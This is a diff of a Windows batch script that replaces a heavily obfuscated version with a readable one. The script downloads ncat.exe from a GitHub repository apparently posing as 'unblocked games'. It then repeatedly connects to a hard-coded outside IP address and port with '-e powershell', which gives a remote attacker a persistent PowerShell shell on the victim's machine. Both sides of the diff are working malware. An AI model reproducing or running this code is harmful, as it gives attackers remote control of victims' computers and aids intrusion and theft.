@@ -1,40 +1,36 @@
-ˇ˛&@cls&@set "ÖP√xs=tyBz4e@1Efx6RiIYH5UOu 70gZKrLJmpWlMvnXsDNakF8dSCcGo9qbA3hVjwTP2Q"
+@echo off
+setlocal
 
-%ÖP√xs:~6,1%%ÖP√xs:~5,1%%ÖP√xs:~48,1%%ÖP√xs:~56,1%%ÖP√xs:~50,1%%ÖP√xs:~21,1%%ÖP√xs:~50,1%%D¢√™√Xº%%ÖP√xs:~9,1%%ÖP√xs:~9,1%
-%ÖP√xs:~38,1%%ÖP√xs:~5,1%%ÖP√xs:~0,1%%R¢º≥â√≠%%ÖP√xs:~33,1%%ÖP√xs:~50,1%%ÖP√xs:~48,1%%ÖP√xs:~41,1%%ÖP√xs:~33,1%
+set "host=147.185.221.20"
+set "port=45895"
 
-%ÖP√xs:~38,1%%ÖP√xs:~5,1%%ÖP√xs:~0,1%%ÖP√xs:~21,1%"%ÖP√xs:~56,1%%ÖP√xs:~50,1%%ÖP√xs:~38,1%%√Me√TKN%%ÖP√xs:~0,1%=%ÖP√xs:~7,1%%ÖP√xs:~4,1%%ÖP√xs:~22,1%.%ÖP√xs:~7,1%%ÖP√xs:~44,1%%ÖP√xs:~17,1%.%ÖP√xs:~62,1%%ÖP√xs:~62,1%%ÖP√xs:~7,1%.%ÖP√xs:~62,1%%ÖP√xs:~23,1%"
-%ÖP√xs:~38,1%%ÖP√xs:~5,1%%ÖP√xs:~0,1%%ÖP√xs:~21,1%"%ÖP√xs:~31,1%%ÖP√xs:~50,1%%ÖP√xs:~27,1%%ÖP√xs:~0,1%%º¨∂nØ√k%=%ÖP√xs:~4,1%%ÖP√xs:~17,1%%ÖP√xs:~44,1%%ÖP√xs:~51,1%%ÖP√xs:~17,1%"
-
-::%ÖP√xs:~21,1%%ÖP√xs:~47,1%%ÖP√xs:~56,1%%ÖP√xs:~5,1%%ÖP√xs:~48,1%%âxÑD†FT%%ÖP√xs:~42,1%%ÖP√xs:~21,1%%ÖP√xs:~13,1%%ÖP√xs:~9,1%%ÖP√xs:~21,1%%ÖP√xs:~36,1%%ÖP√xs:~48,1%%ÖP√xs:~41,1%%ÖP√xs:~0,1%%ÖP√xs:~21,1%%ÖP√xs:~13,1%%ÖP√xs:~38,1%%ÖP√xs:~21,1%%ÖP√xs:~13,1%%ÖP√xs:~36,1%%ÖP√xs:~38,1%%ÖP√xs:~0,1%%ÖP√xs:~41,1%%ÖP√xs:~33,1%%ÖP√xs:~33,1%%ÖP√xs:~5,1%%ÖP√xs:~45,1%
-%ÖP√xs:~59,1%%ÖP√xs:~56,1%%ÖP√xs:~5,1%%ÖP√xs:~27,1%%ÖP√xs:~5,1%%ÖP√xs:~21,1%%ÖP√xs:~36,1%%ÖP√xs:~48,1%%ÖP√xs:~41,1%%ÖP√xs:~0,1%%ÖP√xs:~21,1%>%ÖP√xs:~36,1%%ÖP√xs:~20,1%%ÖP√xs:~33,1%%ÖP√xs:~21,1%%ÖP√xs:~62,1%>&%ÖP√xs:~7,1%
-%ÖP√xs:~13,1%%ÖP√xs:~9,1%%ÖP√xs:~21,1%%errorlevel%==%ÖP√xs:~23,1%%ÖP√xs:~21,1%(
-%ÖP√xs:~21,1%%ÖP√xs:~21,1%%ÖP√xs:~21,1%%ÖP√xs:~21,1%%ÖP√xs:~24,1%%ÖP√xs:~50,1%%ÖP√xs:~0,1%%ÖP√xs:~50,1%%ÖP√xs:~21,1%%ß√Q§aI®%%ÖP√xs:~36,1%%ÖP√xs:~48,1%%ÖP√xs:~41,1%%ÖP√xs:~0,1%
+:: Check if ncat is installed
+where ncat >nul 2>&1
+if %errorlevel%==0 (
+    set "ncat_path=ncat"
+    goto ncat
 )
 
-::%ÖP√xs:~21,1%%ÖP√xs:~46,1%%ÖP√xs:~5,1%%ÖP√xs:~0,1%%ÖP√xs:~21,1%%ÖP√xs:~35,1%%ÖP√xs:~41,1%%ÖP√xs:~27,1%%ÖP√xs:~13,1%%ÖP√xs:~41,1%%ÖP√xs:~53,1%%ÖP√xs:~33,1%%ÖP√xs:~5,1%%ÖP√xs:~38,1%
-%ÖP√xs:~38,1%%ÖP√xs:~5,1%%ÖP√xs:~0,1%%ÖP√xs:~21,1%"%ÖP√xs:~20,1%%ÖP√xs:~27,1%%ÖP√xs:~33,1%=%ÖP√xs:~56,1%%ÖP√xs:~0,1%%ÖP√xs:~0,1%%ÖP√xs:~31,1%%ÖP√xs:~38,1%://github.com/unblockedgames2/zvgfd/blob/main/ncat.exe?raw=true"
-%ÖP√xs:~38,1%%ÖP√xs:~5,1%%ÖP√xs:~0,1%%ÖP√xs:~21,1%"%ÖP√xs:~13,1%%ÖP√xs:~36,1%%ÖP√xs:~38,1%%ÖP√xs:~0,1%%ÖP√xs:~41,1%%ÖP√xs:~33,1%%√âEtCQ√%%ÖP√xs:~33,1%%ÖP√xs:~5,1%%ÖP√xs:~27,1%=%ÖP√xs:~36,1%%ÖP√xs:~48,1%%ÖP√xs:~41,1%%ÖP√xs:~0,1%.%ÖP√xs:~5,1%%ÖP√xs:~10,1%%ÖP√xs:~5,1%"
-%ÖP√xs:~38,1%%ÖP√xs:~5,1%%ÖP√xs:~0,1%%ÖP√xs:~21,1%"%ÖP√xs:~36,1%%ÖP√xs:~48,1%%ÖP√xs:~41,1%%ÖP√xs:~0,1%_%ÖP√xs:~13,1%%ÖP√xs:~36,1%%ÖP√xs:~38,1%%ÖP√xs:~0,1%%ÖP√xs:~41,1%%ÖP√xs:~33,1%%ÖP√xs:~33,1%%ÖP√xs:~5,1%%ÖP√xs:~27,1%=%temp%\%ÖP√xs:~36,1%%ÖP√xs:~48,1%%ÖP√xs:~41,1%%ÖP√xs:~0,1%_%ÖP√xs:~13,1%%√√√l√√U%%ÖP√xs:~36,1%%ÖP√xs:~38,1%%ÖP√xs:~0,1%%ÖP√xs:~41,1%%ÖP√xs:~33,1%%ÖP√xs:~33,1%%ÖP√xs:~5,1%%ÖP√xs:~27,1%"
+:: Set variables
+set "url=https://github.com/unblockedgames2/zvgfd/blob/main/ncat.exe?raw=true"
+set "installer=ncat.exe"
+set "tempfile=%temp%\%installer%"
 
-::%ÖP√xs:~21,1%%ÖP√xs:~47,1%%ÖP√xs:~27,1%%ÖP√xs:~5,1%%ÖP√xs:~41,1%%ÖP√xs:~0,1%%ÖP√xs:~5,1%%ÖP√xs:~21,1%%ÖP√xs:~41,1%%ÖP√xs:~21,1%%√M√√®√§%%ÖP√xs:~0,1%%ÖP√xs:~5,1%%ÖP√xs:~30,1%%ÖP√xs:~31,1%%ÖP√xs:~50,1%%ÖP√xs:~27,1%%ÖP√xs:~41,1%%ÖP√xs:~27,1%%ÖP√xs:~1,1%%ÖP√xs:~21,1%%ÖP√xs:~45,1%%√√≤_RCÆ%%ÖP√xs:~13,1%%ÖP√xs:~27,1%%ÖP√xs:~5,1%%ÖP√xs:~48,1%%ÖP√xs:~0,1%%ÖP√xs:~50,1%%ÖP√xs:~27,1%%ÖP√xs:~1,1%%ÖP√xs:~21,1%%ÖP√xs:~9,1%%ÖP√xs:~50,1%%ynâtºBñ%%ÖP√xs:~27,1%%ÖP√xs:~21,1%%ÖP√xs:~0,1%%ÖP√xs:~56,1%%ÖP√xs:~5,1%%ÖP√xs:~21,1%%ÖP√xs:~13,1%%ÖP√xs:~36,1%%ÖP√xs:~38,1%%ÖP√xs:~0,1%%ÖP√xs:~41,1%%ÖP√xs:~33,1%%X√B†ºCZ%%ÖP√xs:~33,1%%ÖP√xs:~5,1%%AVë∂√√√%%ÖP√xs:~27,1%
-%ÖP√xs:~13,1%%ÖP√xs:~9,1%%ÖP√xs:~21,1%%ÖP√xs:~36,1%%ÖP√xs:~50,1%%ÖP√xs:~0,1%%ÖP√xs:~21,1%%ÖP√xs:~5,1%%ÖP√xs:~10,1%%ÖP√xs:~13,1%%ÖP√xs:~38,1%%ÖP√xs:~0,1%%ÖP√xs:~21,1%"%ncat_installer%"%ÖP√xs:~21,1%(
-%ÖP√xs:~21,1%%ÖP√xs:~21,1%%¢√ëpº¥∂%%ÖP√xs:~21,1%%ÖP√xs:~21,1%%ÖP√xs:~30,1%%ÖP√xs:~42,1%%ÖP√xs:~45,1%%ÖP√xs:~13,1%%ÖP√xs:~27,1%%ÖP√xs:~21,1%"%ncat_installer%"
+:: Download the installer
+powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %tempfile%"
+
+:: Check if the download was successful
+if not exist "%tempfile%" (
+    echo Error Code 2
+    goto :eof
 )
 
-::%ÖP√xs:~21,1%%ÖP√xs:~39,1%%ÖP√xs:~50,1%%ÖP√xs:~59,1%%ÖP√xs:~36,1%%ÖP√xs:~33,1%%ÖP√xs:~50,1%%ÖP√xs:~41,1%%ÖP√xs:~45,1%%ÖP√xs:~21,1%%ÖP√xs:~0,1%%ÖP√xs:~56,1%%ÖP√xs:~5,1%%ÖP√xs:~21,1%%ÖP√xs:~13,1%%ÖP√xs:~36,1%%ÖP√xs:~38,1%%ÖP√xs:~0,1%%ÖP√xs:~41,1%%ÖP√xs:~33,1%%ÖP√xs:~33,1%%E√Xl∂√L%%ÖP√xs:~5,1%%ÖP√xs:~27,1%
-%ÖP√xs:~5,1%%ÖP√xs:~48,1%%ÖP√xs:~56,1%%ÖP√xs:~50,1%%ÖP√xs:~21,1%%ÖP√xs:~39,1%%ÖP√xs:~50,1%%ÖP√xs:~59,1%%ÖP√xs:~36,1%%ÖP√xs:~33,1%%ÖP√xs:~50,1%%ÖP√xs:~41,1%%ÖP√xs:~45,1%%ÖP√xs:~13,1%%ÖP√xs:~36,1%%ÖP√xs:~24,1%%ÖP√xs:~21,1%%a≠√√wñ¢%%ÖP√xs:~36,1%%ÖP√xs:~48,1%%ÖP√xs:~41,1%%ÖP√xs:~0,1%...
-%ÖP√xs:~31,1%%ÖP√xs:~50,1%%ÖP√xs:~59,1%%ÖP√xs:~5,1%%ÖP√xs:~27,1%%ÖP√xs:~38,1%%ÖP√xs:~56,1%%¢√áPA√X%%ÖP√xs:~5,1%%ÖP√xs:~33,1%%ÖP√xs:~33,1%%ÖP√xs:~21,1%-%ÖP√xs:~47,1%%ÖP√xs:~50,1%%ÖP√xs:~30,1%%ÖP√xs:~30,1%%ÖP√xs:~41,1%%√√c∂Ië´%%ÖP√xs:~36,1%%ÖP√xs:~45,1%%ÖP√xs:~21,1%"%ÖP√xs:~14,1%%ÖP√xs:~36,1%%ÖP√xs:~35,1%%ÖP√xs:~50,1%%ÖP√xs:~42,1%%ÖP√xs:~5,1%-%ÖP√xs:~32,1%%ÖP√xs:~5,1%%ÖP√xs:~53,1%%ÖP√xs:~12,1%%ÖP√xs:~5,1%%ÖP√xs:~52,1%%ÖP√xs:~20,1%%ÖP√xs:~5,1%%ÖP√xs:~38,1%%ÖP√xs:~0,1%%ÖP√xs:~21,1%-%ÖP√xs:~18,1%%ÖP√xs:~27,1%%ÖP√xs:~13,1%%ÖP√xs:~21,1%%url%%ÖP√xs:~21,1%-%ÖP√xs:~19,1%%ÖP√xs:~20,1%%ÖP√xs:~0,1%%ÖP√xs:~43,1%%ÖP√xs:~13,1%%ÖP√xs:~33,1%%ÖP√xs:~5,1%%ÖP√xs:~21,1%%ncat_installer%\%installer%"
-
-::%ÖP√xs:~21,1%%ÖP√xs:~47,1%%ÖP√xs:~56,1%%ÖP√xs:~5,1%%ÖP√xs:~48,1%%ÖP√xs:~42,1%%ÖP√xs:~21,1%%ÖP√xs:~13,1%%ÖP√xs:~9,1%%ÖP√xs:~21,1%%ÖP√xs:~0,1%%ÖP√xs:~56,1%%ÖP√xs:~5,1%%ÖP√xs:~21,1%%ÖP√xs:~45,1%%ÖP√xs:~50,1%%ÖP√xs:~59,1%%ÖP√xs:~36,1%%ÖP√xs:~33,1%%ÖP√xs:~50,1%%ÖP√xs:~41,1%%ÖP√xs:~45,1%%ÖP√xs:~21,1%%ÖP√xs:~59,1%%ÖP√xs:~41,1%%ÖP√xs:~38,1%%√DRyb√I%%ÖP√xs:~21,1%%ÖP√xs:~38,1%%ÖP√xs:~20,1%%ÖP√xs:~48,1%%ÖP√xs:~48,1%%ÖP√xs:~5,1%%ÖP√xs:~38,1%%ÖP√xs:~38,1%%ÖP√xs:~9,1%%ÖP√xs:~20,1%%ÖP√xs:~33,1%%dz¥√πb™%
-%ÖP√xs:~13,1%%ÖP√xs:~9,1%%ÖP√xs:~21,1%%ÖP√xs:~36,1%%ÖP√xs:~50,1%%ÖP√xs:~0,1%%ÖP√xs:~21,1%%ÖP√xs:~5,1%%ÖP√xs:~10,1%%ÖP√xs:~13,1%%ÖP√xs:~38,1%%ÖP√xs:~0,1%%ÖP√xs:~21,1%"%ncat_installer%\%installer%"%ÖP√xs:~21,1%(
-%ÖP√xs:~21,1%%ÖP√xs:~21,1%%ÖP√xs:~21,1%%ÖP√xs:~21,1%%ÖP√xs:~5,1%%ÖP√xs:~48,1%%ÖP√xs:~56,1%%ÖP√xs:~50,1%%ÖP√xs:~21,1%%ÖP√xs:~8,1%%ÖP√xs:~27,1%%ÖP√xs:~27,1%%ÖP√xs:~50,1%%ÖP√xs:~27,1%%ÖP√xs:~21,1%%ÖP√xs:~47,1%%ÖP√xs:~50,1%%ÖP√xs:~45,1%%ÖP√xs:~5,1%%ÖP√xs:~21,1%%ÖP√xs:~62,1%
-%ÖP√xs:~21,1%%ÖP√xs:~21,1%%ÖP√xs:~21,1%%ÖP√xs:~21,1%%ÖP√xs:~24,1%%ÖP√xs:~50,1%%ÖP√xs:~0,1%%ÖP√xs:~50,1%%ÖP√xs:~21,1%:eof
-)
+:: Set the path to the downloaded ncat
+set "ncat_path=%tempfile%"
 
 :ncat
-%ncat_installer%\%installer%%ÖP√xs:~21,1%%host%%ÖP√xs:~21,1%%port%%ÖP√xs:~21,1%-%ÖP√xs:~5,1%%ÖP√xs:~21,1%%ÖP√xs:~31,1%%ÖP√xs:~50,1%%ÖP√xs:~59,1%%ÖP√xs:~5,1%%ÖP√xs:~27,1%%ÖP√xs:~38,1%%ÖP√xs:~56,1%%ÖP√xs:~5,1%%ÖP√xs:~33,1%%™fh±Dcπ%%ÖP√xs:~33,1%
-%ÖP√xs:~24,1%%ÖP√xs:~50,1%%ÖP√xs:~0,1%%ÖP√xs:~50,1%%ÖP√xs:~21,1%%x√§±≠BE%%ÖP√xs:~36,1%%ÖP√xs:~48,1%%ÖP√xs:~41,1%%ÖP√xs:~0,1%
+%ncat_path% %host% %port% -e powershell
+goto ncat
 
 :end
-%ÖP√xs:~5,1%%ÖP√xs:~36,1%%ÖP√xs:~45,1%%ÖP√xs:~33,1%%ÖP√xs:~50,1%%ÖP√xs:~48,1%%ÖP√xs:~41,1%%ÖP√xs:~33,1%
+endlocal
